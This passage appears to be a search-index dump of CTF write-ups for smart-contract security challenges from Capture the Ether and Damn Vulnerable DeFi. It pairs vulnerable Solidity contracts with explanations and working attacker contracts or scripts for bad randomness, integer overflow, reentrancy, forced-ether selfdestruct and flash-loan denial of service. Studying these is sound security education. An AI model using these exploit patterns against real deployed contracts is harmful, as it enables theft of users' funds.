answer = uint8(keccak256(block.blockhash(block.number - 1), \n</code></pre> <p>Because of the atomic nature of ethereum tranactions (they all happen at once, at the same block), we can create Attacker contract, and calculate the answer using the above formula and call the guess(uint8 n) function of the  GuessTheNewNumberChallenge contract from within the Attacker contract.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the GuessTheNewNumberChallenge contract inside the Attacker contract, send ETH to the contract on deployment, we need this ETH to be able to guess later</li> <li> <p>create guessTheNumber() external function inside Attacker, and inside of it  <ul> <li>calculate the guessing number using uint8(keccak256(block.blockhash(block.number - 1), now))</li> <li>call guess() function inside GuessTheNewNumberChallenge contract, with the number calculated above as argument, and the balance of the Attacker contract as value</li> </ul> </p> </li> <li> <p>call guessTheNumber() function from our account</p> </li> </ol>"},{"location":"2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n  GuessTheNewNumberChallenge private guessContract;\n\n  function Attacker(address _guessContract) public payable {\n    guessContract = GuessTheNewNumberChallenge(_guessContract);\n  }\n\n  function guessTheNumber() external {\n    uint8 number = uint8(keccak256(block.blockhash(block.number - 1), now));\n    guessContract.guess.value(address(this).balance)(number);\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/","title":"Predict the future","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract PredictTheFutureChallenge {\n  address guesser;\nuint8 guess;\nuint256 settlementBlockNumber;\n\nfunction PredictTheFutureChallenge() public payable {\n    require(msg.value == 1 ether);\n}\n\n  function isComplete() public view returns (bool) {\n    return address(this).balance == 0;\n}\n\n  function lockInGuess(uint8 n) public payable {\n    require(guesser == 0);\nrequire(msg.value == 1 ether);\n\nguesser = msg.sender;\nguess = n;\nsettlementBlockNumber = block.number + 1;\n}\n\n  function settle() public {\n    require(msg.sender == guesser);\nrequire(block.number &gt; settlementBlockNumber);\n\nuint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\n\nguesser = 0;\nif (guess == answer) {\n      msg.sender.transfer(2 ether);\n}\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/#goal","title":"Goal","text":"<p>Guess the number to win and get all the ETH from the smart contract</p>"},{"location":"2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/#exploit","title":"Exploit","text":"<ol> <li>create Attacker contract, and create instance from the PredictTheFutureChallenge contract inside the Attacker contract</li> <li> <p>call lockInGuess() function from Attacker contract, this function will make external call to the lockInGuess() function inside PredictTheFutureChallenge contract, with 1 as argument for the n parameter  <ul> <li>the guessing number should be in range from 0 to 9, since the equation for getting the answer uses % 10</li> </ul></p> </li> <li> <p>this step would probably need to be repeated: call takeTheMoney() external function inside Attacker, here we check if the answer will be equal to the previously locked in guess  <ul> <li>if it is we call the seetle() function from PredictTheFutureChallenge contract</li> <li>if it is not we revert the transaction, this allows us to stay in the game</li> </ul> </p> </li> </ol>"},{"location":"2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n  PredictTheFutureChallenge private predictFuture;\n\n  function Attacker(address _predictFuture) public {\n    predictFuture = PredictTheFutureChallenge(_predictFuture);\n  }\n\n  function lockInGuess() external payable {\n    predictFuture.lockInGuess.value(msg.value)(1);\n  }\n\n  function takeTheMoney() external {\n    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\n    require(answer == 1);\n    predictFuture.settle();\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/06.%20Predict%20the%20block%20hash/","title":"Predict the block hash","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract PredictTheBlockHashChallenge {\n  address guesser;\nbytes32 guess;\nuint256 settlementBlockNumber;\n\nfunction PredictTheBlockHashChallenge() public payable {\n    require(msg.value == 1 ether);\n}\n\n  function isComplete() public view returns (bool) {\n    return address(this).balance == 0;\n}\n\n  function lockInGuess(bytes32 hash) public payable {\n    require(guesser == 0);\nrequire(msg.value == 1 ether);\n\nguesser = msg.sender;\nguess = hash;\nsettlementBlockNumber = block.number + 1;\n}\n\n  function settle() public {\n    require(msg.sender == guesser);\nrequire(block.number &gt; settlementBlockNumber);\n\nbytes32 answer = block.blockhash(settlementBlockNumber);\n\nguesser = 0;\nif (guess == answer) {\n      msg.sender.transfer(2 ether);\n}\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/06.%20Predict%20the%20block%20hash/#goal","title":"Goal","text":"<p>Guess the number to win and get all the ETH from the smart contract</p>"},{"location":"2.%20Capture%20the%20Ether/06.%20Predict%20the%20block%20hash/#exploit","title":"Exploit","text":"<p>The following function from the smart contract can be exploited:</p> <pre><code>  bytes32 answer = block.blockhash(settlementBlockNumber);\n</code></pre> <p>The reason why this line of code is vulnerable is because blockhash function (which gives us the hash of the given block) only works for 256 most recent blocks, otherwise it returns 0.</p> <p>To exploit the contract we need to:</p> <ol> <li>call lockInGuess with \"0x0000000000000000000000000000000000000000000000000000000000000000\" as argument for the bytes32 hash parameter</li> <li>wait for more than 256 blocks to be mined</li> <li>call settle()</li> </ol>"},{"location":"2.%20Capture%20the%20Ether/07.%20Token%20sale/","title":"Token sale","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\nmapping(address =&gt; uint256) public balanceOf;\nuint256 constant PRICE_PER_TOKEN = 1 ether;\n\nfunction TokenSaleChallenge(address _player) public payable {\nrequire(msg.value == 1 ether);\n}\n\nfunction isComplete() public view returns (bool) {\nreturn address(this).balance &lt; 1 ether;\n}\n\nfunction buy(uint256 numTokens) public payable {\nrequire(msg.value == numTokens * PRICE_PER_TOKEN);\n\nbalanceOf[msg.sender] += numTokens;\n}\n\nfunction sell(uint256 numTokens) public {\nrequire(balanceOf[msg.sender] &gt;= numTokens);\n\nbalanceOf[msg.sender] -= numTokens;\nmsg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n}\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/07.%20Token%20sale/#goal","title":"Goal","text":"<p>Make the ETH balance in the contract less than 1 ether</p>"},{"location":"2.%20Capture%20the%20Ether/07.%20Token%20sale/#exploit","title":"Exploit","text":"<p>As per the CTF description, this token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p> <p>The TokenSaleChallenge starts with balance of 1 ether, every time we buy new tokens we increase the contract ether balance, and every time we sell tokens we decrease the balance.</p> <p>In order to leave the contract with less than 1 ether, we must first find a way to buy more tokens, to increase our balance of tokens, so that the balance of our tokens will be quite bigger than the balance of ETH stored in the contract.</p> <p>We can do this with the help of arithmetic overflow. The place where we can make the overflow is in the buy() function.</p> <p>The numTokens variable is of type uint256, the maximum value it can store is 115792089237316195423570985008687907853269984665640564039457584007913129639935</p> <p>We can't possibly call the buy() function with this value, because we don't have enough ether balance in our account to buy that much tokens.</p> <p>First we need to think in terms of wei and not ether. We know that 1 ether = 10^18 wei</p> <p>From the following code:</p> <pre><code>require(msg.value == numTokens * PRICE_PER_TOKEN);\n</code></pre> <p>we can draw a conclusion, to pass this require statement, the amount of tokens (numTokens) will be multiplied by 1 ether, and as we said earlier the EVM will interpret 1 ether as 10^18 or 1000000000000000000 wei.</p> <p>And if we try to buy the following amount:</p> <p>(115792089237316195423570985008687907853269984665640564039457584007913129639935 / 10^18) + 1 = 115792089237316195423570985008687907853269984665640564039458</p> <p>Multiplying it by 10^18 will result in an overflow of 415992086870360064, a little bit below half an ether. So, sending that amount of wei as the msg.value will pass the require statement and give us a lot of tokens.</p> <p>To exploit the contract we need to:</p> <ol> <li>call the buy() function with 115792089237316195423570985008687907853269984665640564039458 as numTokens and 415992086870360064 wei as msg.value.</li> <li>call the sell() function with 1 token as parameter</li> </ol>"},{"location":"2.%20Capture%20the%20Ether/08.%20Token%20whale/","title":"Token whale","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract TokenWhaleChallenge {\naddress player;\n\nuint256 public totalSupply;\nmapping(address =&gt; uint256) public balanceOf;\nmapping(address =&gt; mapping(address =&gt; uint256)) public allowance;\n\nstring public name = \"Simple ERC20 Token\";\nstring public symbol = \"SET\";\nuint8 public decimals = 18;\n\nfunction TokenWhaleChallenge(address _player) public {\nplayer = _player;\ntotalSupply = 1000;\nbalanceOf[player] = 1000;\n}\n\nfunction isComplete() public view returns (bool) {\nreturn balanceOf[player] &gt;= 1000000;\n}\n\nevent Transfer(address indexed from, address indexed to, uint256 value);\n\nfunction _transfer(address to, uint256 value) internal {\nbalanceOf[msg.sender] -= value;\nbalanceOf[to] += value;\n\nemit Transfer(msg.sender, to, value);\n}\n\nfunction transfer(address to, uint256 value) public {\nrequire(balanceOf[msg.sender] &gt;= value);\nrequire(balanceOf[to] + value &gt;= balanceOf[to]);\n\n_transfer(to, value);\n}\n\nevent Approval(address indexed owner, address indexed spender, uint256 value);\n\nfunction approve(address spender, uint256 value) public {\nallowance[msg.sender][spender] = value;\nemit Approval(msg.sender, spender, value);\n}\n\nfunction transferFrom(address from, address to, uint256 value) public {\nrequire(balanceOf[from] &gt;= value);\nrequire(balanceOf[to] + value &gt;= balanceOf[to]);\nrequire(allowance[from][msg.sender] &gt;= value);\n\nallowance[from][msg.sender] -= value;\n_transfer(to, value);\n}\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/08.%20Token%20whale/#goal","title":"Goal","text":"<p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge</p>"},{"location":"2.%20Capture%20the%20Ether/08.%20Token%20whale/#exploit","title":"Exploit","text":"<p>As per the CTF, we start our balance with 1000 tokens, and we need to find a way to acquire more tokens. First thing that comes to my mind to find a way to cause arithmetic overflow or underflow.</p> <p>The transfer() function itself can not be expoloited, but there is an issue with the checks inside transferFrom().</p> <p>To exploit the contract we need to:</p> <ol> <li>call transfer() from our account (player) and tansfer 1000 tokens to another address (let's say secondPlayer)</li> <li>call approve() from secondPlayer and approve the first player (our account) to be able to transfer the tokens on their behalf, the value for the approval can be set to 2000</li> <li>call transferFrom() from our account(player), and transfer 1000 tokens from the secondPlayer to another address (we can use secondPlayer again as the to address), ex. tansferFrom(secondPlayer, secondPlayer, 1000)</li> </ol> <p>By calling transferFrom from our account, the internal _transfer function will be called, and this is the function that will underflow our balance of tokens.</p> <pre><code>  balanceOf[msg.sender] -= value;\n</code></pre> <p>Remeber that in the first step we transferred our tokens and our balance is now 0, the code above will cause our balance to be equal 0 - 1000, and that is really big number.</p>"},{"location":"2.%20Capture%20the%20Ether/09.%20Retirement%20fund/","title":"Retirement fund","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract RetirementFundChallenge {\n  uint256 startBalance;\naddress owner = msg.sender;\naddress beneficiary;\nuint256 expiration = now + 10 years;\n\nfunction RetirementFundChallenge(address player) public payable {\n    require(msg.value == 1 ether);\n\nbeneficiary = player;\nstartBalance = msg.value;\n}\n\n  function isComplete() public view returns (bool) {\n    return address(this).balance == 0;\n}\n\n  function withdraw() public {\n    require(msg.sender == owner);\n\nif (now &lt; expiration) {\n      // early withdrawal incurs a 10% penalty\nmsg.sender.transfer(address(this).balance * 9 / 10);\n} else {\n      msg.sender.transfer(address(this).balance);\n}\n  }\n\n  function collectPenalty() public {\n    require(msg.sender == beneficiary);\n\nuint256 withdrawn = startBalance - address(this).balance;\n\n// an early withdrawal occurred\nrequire(withdrawn &gt; 0);\n\n// penalty is what's left\n    msg.sender.transfer(address(this).balance);\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/09.%20Retirement%20fund/#goal","title":"Goal","text":"<p>Withdraw all the ETH from the smart contract</p>"},{"location":"2.%20Capture%20the%20Ether/09.%20Retirement%20fund/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>We will sefdestruct the Attacker contract and send the ether in the Attacker to the RetirementFundChallenge contract.</p> <p>This will cause the following calculation to underflow:</p> <pre><code>  uint256 withdrawn = startBalance - address(this).balance;\n</code></pre> <p>and calling collectPenalty() will allow us to withdraw all the funds from RetirementFundChallenge contract</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and send the address of the RetirementFundChallenge contract inside the Attacker contract, make the contructor payable and send some ETH to on Attacker creation (0.0001 eth for example)</li> <li>create attack() external function inside Attacker, and call the selfdestruct() function with the address of the RetirementFundChallenge as argument</li> <li>call collectPenalty() from RetirementFundChallenge contract</li> </ol>"},{"location":"2.%20Capture%20the%20Ether/09.%20Retirement%20fund/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n  address private fund;\n\n  function Attacker(address _fund) public payable {\n    fund = _fund;\n  }\n\n  function attack() external {\n    selfdestruct(fund);\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/10.%20Token%20bank/","title":"Token bank","text":"<pre><code>pragma solidity ^0.4.21;\n\ninterface ITokenReceiver {\nfunction tokenFallback(address from, uint256 value, bytes data) external;\n}\n\ncontract SimpleERC223Token {\n// Track how many tokens are owned by each address.\nmapping (address =&gt; uint256) public balanceOf;\n\nstring public name = \"Simple ERC223 Token\";\nstring public symbol = \"SET\";\nuint8 public decimals = 18;\n\nuint256 public totalSupply = 1000000 * (uint256(10) ** decimals);\n\nevent Transfer(address indexed from, address indexed to, uint256 value);\n\nfunction SimpleERC223Token() public {\nbalanceOf[msg.sender] = totalSupply;\nemit Transfer(address(0), msg.sender, totalSupply);\n}\n\nfunction isContract(address _addr) private view returns (bool is_contract) {\nuint length;\nassembly {\n//retrieve the size of the code on target address, this needs assembly\nlength := extcodesize(_addr)\n}\nreturn length &gt; 0;\n}\n\nfunction transfer(address to, uint256 value) public returns (bool success) {\nbytes memory empty;\nreturn transfer(to, value, empty);\n}\n\nfunction transfer(address to, uint256 value, bytes data) public returns (bool) {\nrequire(balanceOf[msg.sender] &gt;= value);\n\nbalanceOf[msg.sender] -= value;\nbalanceOf[to] += value;\nemit Transfer(msg.sender, to, value);\n\nif (isContract(to)) {\nITokenReceiver(to).tokenFallback(msg.sender, value, data);\n}\nreturn true;\n}\n\nevent Approval(address indexed owner, address indexed spender, uint256 value);\n\nmapping(address =&gt; mapping(address =&gt; uint256)) public allowance;\n\nfunction approve(address spender, uint256 value)\npublic\nreturns (bool success)\n{\nallowance[msg.sender][spender] = value;\nemit Approval(msg.sender, spender, value);\nreturn true;\n}\n\nfunction transferFrom(address from, address to, uint256 value)\npublic\nreturns (bool success)\n{\nrequire(value &lt;= balanceOf[from]);\nrequire(value &lt;= allowance[from][msg.sender]);\n\nbalanceOf[from] -= value;\nbalanceOf[to] += value;\nallowance[from][msg.sender] -= value;\nemit Transfer(from, to, value);\nreturn true;\n}\n}\n\ncontract TokenBankChallenge {\nSimpleERC223Token public token;\nmapping(address =&gt; uint256) public balanceOf;\n\nfunction TokenBankChallenge(address player) public {\ntoken = new SimpleERC223Token();\n\n// Divide up the 1,000,000 tokens, which are all initially assigned to\n// the token contract's creator (this contract).\nbalanceOf[msg.sender] = 500000 * 10**18;  // half for me\nbalanceOf[player] = 500000 * 10**18;      // half for you\n}\n\nfunction isComplete() public view returns (bool) {\nreturn token.balanceOf(this) == 0;\n}\n\nfunction tokenFallback(address from, uint256 value, bytes) public {\nrequire(msg.sender == address(token));\nrequire(balanceOf[from] + value &gt;= balanceOf[from]);\n\nbalanceOf[from] += value;\n}\n\nfunction withdraw(uint256 amount) public {\nrequire(balanceOf[msg.sender] &gt;= amount);\n\nrequire(token.transfer(msg.sender, amount));\nbalanceOf[msg.sender] -= amount;\n}\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/10.%20Token%20bank/#goal","title":"Goal","text":"<p>Withrdaw all of the SET tokens that TokenBankChallenge contract has in possession</p>"},{"location":"2.%20Capture%20the%20Ether/10.%20Token%20bank/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>There are two issues with the TokenBankChallenge, first it is re-entrant (<code>withdraw()</code> function) and second there is flawed business logic in handling the tokens that the bank possesses.</p> <p>To exploit the contract we need to:</p> <ol> <li> <p>create Attacker contract, this contract will be inheriting ITokenReceiver interface and must have tokenFallback() function implemented, create instances from the SimpleERC223Token contract and TokenBankChallenge contract inside the Attacker contract. This contract will:  <ul> <li>have count storage variable to track how many times tokenFallback() is called</li> <li>have external transfer() function, we will call this function to transfer SET tokens from the attacker to the TokenBankChallenge contract, inside it we will make a call to the SimpleERC223Token transfer() function</li> <li>tokenFallback() function implemented, this is the function were we will cause the reentrancy to happen</li> <li>withdraw() external function, this is the function that will initiate the reentrant call</li> </ul></p> </li> <li> <p>withdraw all of the tokens that our account (player) has in possesion, calling the withdraw function from the TokenBankChallenge contract</p> </li> <li>transfer all of the tokens from the our account (player) to the Attacker contract, using the transfer() function from SimpleERC223Token</li> <li>call the transfer() function from the Attacker contract and transfer all of the SET tokens from the Attacker to the TokenBankChallenge contract, amount should be 500000000000000000000000</li> <li>call the withdraw() function from Attacker contract</li> </ol>"},{"location":"2.%20Capture%20the%20Ether/10.%20Token%20bank/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker is ITokenReceiver {\n  SimpleERC223Token private token;\nTokenBankChallenge private bank;\nuint256 public count;\n\nfunction Hack(address _token, address _bank) public {\n    token = SimpleERC223Token(_token);\nbank = TokenBankChallenge(_bank);\n}\n\n  function transfer(address to, uint256 value) external {\n    token.transfer(to, value, \"\");\n}\n\n  function tokenFallback(address from, uint256 value, bytes data) external {\n    count++;\nif(count == 2) {\n      bank.withdraw(500000000000000000000000);\n}\n  }\n\n  function withdraw(uint256 amount) external {\n    bank.withdraw(amount);\n}\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/01.%20Unstoppable/","title":"Unstoppable","text":"<p>UnstoppableVault.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"solmate/src/utils/FixedPointMathLib.sol\";\nimport \"solmate/src/utils/ReentrancyGuard.sol\";\nimport { SafeTransferLib, ERC4626, ERC20 } from \"solmate/src/mixins/ERC4626.sol\";\nimport \"solmate/src/auth/Owned.sol\";\nimport { IERC3156FlashBorrower, IERC3156FlashLender } from \"@openzeppelin/contracts/interfaces/IERC3156.sol\";\n\n/**\n * @title UnstoppableVault\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626 {\n    using SafeTransferLib for ERC20;\n    using FixedPointMathLib for uint256;\n\n    uint256 public constant FEE_FACTOR = 0.05 ether;\n    uint64 public constant GRACE_PERIOD = 30 days;\n\n    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;\n\n    address public feeRecipient;\n\n    error InvalidAmount(uint256 amount);\n    error InvalidBalance();\n    error CallbackFailed();\n    error UnsupportedCurrency();\n\n    event FeeRecipientUpdated(address indexed newFeeRecipient);\n\n    constructor(ERC20 _token, address _owner, address _feeRecipient)\n        ERC4626(_token, \"Oh Damn Valuable Token\", \"oDVT\")\n        Owned(_owner)\n    {\n        feeRecipient = _feeRecipient;\n        emit FeeRecipientUpdated(_feeRecipient);\n    }\n\n    /**\n     * @inheritdoc IERC3156FlashLender\n     */\n    function maxFlashLoan(address _token) public view returns (uint256) {\n        if (address(asset) != _token)\n            return 0;\n\n        return totalAssets();\n    }\n\n    /**\n     * @inheritdoc IERC3156FlashLender\n     */\n    function flashFee(address _token, uint256 _amount) public view returns (uint256 fee) {\n        if (address(asset) != _token)\n            revert UnsupportedCurrency();\n\n        if (block.timestamp &lt; end &amp;&amp; _amount &lt; maxFlashLoan(_token)) {\n            return 0;\n        } else {\n            return _amount.mulWadUp(FEE_FACTOR);\n        }\n    }\n\n    function setFeeRecipient(address _feeRecipient) external onlyOwner {\n        if (_feeRecipient != address(this)) {\n            feeRecipient = _feeRecipient;\n            emit FeeRecipientUpdated(_feeRecipient);\n        }\n    }\n\n    /**\n     * @inheritdoc ERC4626\n     */\n    function totalAssets() public view override returns (uint256) {\n        assembly { // better safe than sorry\n            if eq(sload(0), 2) {\n                mstore(0x00, 0xed3ba6a6)\n                revert(0x1c, 0x04)\n            }\n        }\n        return asset.balanceOf(address(this));\n    }\n\n    /**\n     * @inheritdoc IERC3156FlashLender\n     */\n    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address _token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool) {\n        if (amount == 0) revert InvalidAmount(0); // fail early\n        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement\n        uint256 balanceBefore = totalAssets();\n        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement\n        uint256 fee = flashFee(_token, amount);\n        // transfer tokens out + execute callback on receiver\n        ERC20(_token).safeTransfer(address(receiver), amount);\n        // callback must return magic value, otherwise assume it failed\n        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256(\"IERC3156FlashBorrower.onFlashLoan\"))\n            revert CallbackFailed();\n        // pull amount + fee from receiver, then pay the fee to the recipient\n        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);\n        ERC20(_token).safeTransfer(feeRecipient, fee);\n        return true;\n    }\n\n    /**\n     * @inheritdoc ERC4626\n     */\n    function beforeWithdraw(uint256 assets, uint256 shares) internal override nonReentrant {}\n\n    /**\n     * @inheritdoc ERC4626\n     */\n    function afterDeposit(uint256 assets, uint256 shares) internal override nonReentrant {}\n}\n</code></pre> <p>ReceiverUnstoppable.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\";\nimport \"solmate/src/auth/Owned.sol\";\nimport { UnstoppableVault, ERC20 } from \"../unstoppable/UnstoppableVault.sol\";\n\n/**\n * @title ReceiverUnstoppable\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {\n    UnstoppableVault private immutable pool;\n\n    error UnexpectedFlashLoan();\n\n    constructor(address poolAddress) Owned(msg.sender) {\n        pool = UnstoppableVault(poolAddress);\n    }\n\n    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata\n    ) external returns (bytes32) {\n        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)\n            revert UnexpectedFlashLoan();\n\n        ERC20(token).approve(address(pool), amount);\n\n        return keccak256(\"IERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    function executeFlashLoan(uint256 amount) external onlyOwner {\n        address asset = address(pool.asset());\n        pool.flashLoan(\n            this,\n            asset,\n            amount,\n            bytes(\"\")\n        );\n    }\n}\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/01.%20Unstoppable/#goal","title":"Goal","text":"<p>Make the vault stop offering flash loans</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/01.%20Unstoppable/#exploit","title":"Exploit","text":"<p>After digging into the smart contracts, I noticed that there is a flaw into the logic of UnstoppableVault contract, located inside flashLoan() function.</p> <p>The specific issue is in the following two lines:</p> <pre><code>uint256 balanceBefore = totalAssets();\nif (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement\n</code></pre> <p>This check will always pass if new tokens are minted to the UnstoppableVault contract, but since we (the player) hold some of the tokens, we can transfer our tokens to the UnstoppableVault contract, and make this check to always fail, therefore no one will be able to get a flash loan.</p>"},{"location":"3.%20Damn%20Vulnerable%20Defi/01.%20Unstoppable/#solution-code","title":"Solution code","text":"<pre><code>const { ethers } = require('hardhat');\nconst { expect } = require('chai');\n\ndescribe('[Challenge] Unstoppable', function () {\nlet deployer, player, someUser;\nlet token, vault, receiverContract;\n\nconst TOKENS_IN_VAULT = 1000000n * 10n ** 18n;\nconst INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;\n\nbefore(async function () {\n/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */\n\n[deployer, player, someUser] = await ethers.getSigners();\n\ntoken = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();\nvault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(\ntoken.address,\ndeployer.address, // owner\ndeployer.address // fee recipient\n);\nexpect(await vault.asset()).to.eq(token.address);\n\nawait token.approve(vault.address, TOKENS_IN_VAULT);\nawait vault.deposit(TOKENS_IN_VAULT, deployer.address);\n\nexpect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);\nexpect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);\nexpect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);\nexpect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);\nexpect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);\nexpect(\nawait vault.flashFee(token.address, TOKENS_IN_VAULT)\n).to.eq(50000n * 10n ** 18n);\n\nawait token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);\nexpect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);\n\n// Show it's possible for someUser to take out a flash loan\n        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(\n            vault.address\n        );\n        await receiverContract.executeFlashLoan(100n * 10n ** 18n);\n    });\n\n    it('Execution', async function () {\n/** CODE YOUR SOLUTION HERE */\nconst playerTokenBalance = await token.balanceOf(player.address);\nawait token.connect(player).transfer(vault.address, playerTokenBalance);\n});\n\nafter(async function () {\n/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */\n\n// It is no longer possible to execute flash loans\nawait expect(\nreceiverContract.executeFlashLoan(100n * 10n ** 18n)\n).to.be.reverted;\n});\n});\n</code></pre>"},{"location":"3.%20Damn%20Vulnerable%20Defi/02.%20Naive%20receiver/","title":"Naive receiver","text":"<p>FlashLoanReceiver.sol</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"solady/src/utils/SafeTransferLib.sol\";\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\";\nimport \"./NaiveReceiverLenderPool.sol\";\n\n/**\n * @title FlashLoanReceiver\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract FlashLoanReceiver is IERC3156FlashBorrower {\n\n    address private pool;\n    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n    error UnsupportedCurrency();\n\n    constructor(address _pool) {\n        pool = _pool;\n    }\n\n    function onFlashLoan(\n        address,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata\n    ) external returns (bytes32) {\n        assembly { // gas savings\n            if iszero(eq(sload(pool.slot), caller())) {\n                mstore(0x00, 0x48f5c3ed)\n                revert(0x1c, 0x04)\n            }\n        }\n\n        if (token != ETH)\n            revert UnsupportedCurrency();\n\n        uint256 amountToBeRepaid;\n        unchecked {\n            amountToBeRepaid = amount + fee;\n        }\n\n        _executeActionDuringFlashLoan();\n\n        // Return funds to pool\n        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);\n\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    // Internal function where the funds received would be used\n    function _executeActionDuringFlashLoan() internal { }\n\n    // Allow deposits of ETH\n    receive() external payable {}\n}\n</code></pre> <p>NaiveReceiverLenderPool.sol</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol\";\nimport \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\";\nimport \"solady/src/utils/SafeTransferLib.sol\";\nimport \"./FlashLoanReceiver.sol\";\n\n/**\n * @title NaiveReceiverLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {\n\n    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan\n    bytes32 private constant CALLBACK_SUCCESS = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n    error RepayFailed();\n    error UnsupportedCurrency();\n    error CallbackFailed();\n\n    function maxFlashLoan(address token) external view returns (uint256) {\n        if (token == ETH) {\n            return address(this).balance;\n        }\n        return 0;\n    }\n\n    function flashFee(address token, uint256) external pure returns (uint256) {\n        if (token != ETH)\n            revert UnsupportedCurrency();\n        return FIXED_FEE;\n    }\n\n    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool) {\n        if (token != ETH)\n            revert UnsupportedCurrency();\n\n        uint256 balanceBefore = address(this).balance;\n\n        // Transfer ETH and handle control to receiver\n        SafeTransferLib.safeTransferETH(address(receiver), amount);\n        if(receiver.onFlashLoan(\n            msg.sender,\n            ETH,\n            amount,\n            FIXED_FEE,\n            data\n        ) != CALLBACK_SUCCESS) {\n            revert CallbackFailed();\n        }\n\n        if (address(this).balance &lt; balanceBefore + FIXED_FEE)\n            revert RepayFailed();\n\n        return true;\n    }\n\n    // Allow deposits of ETH\n    receive() external payable 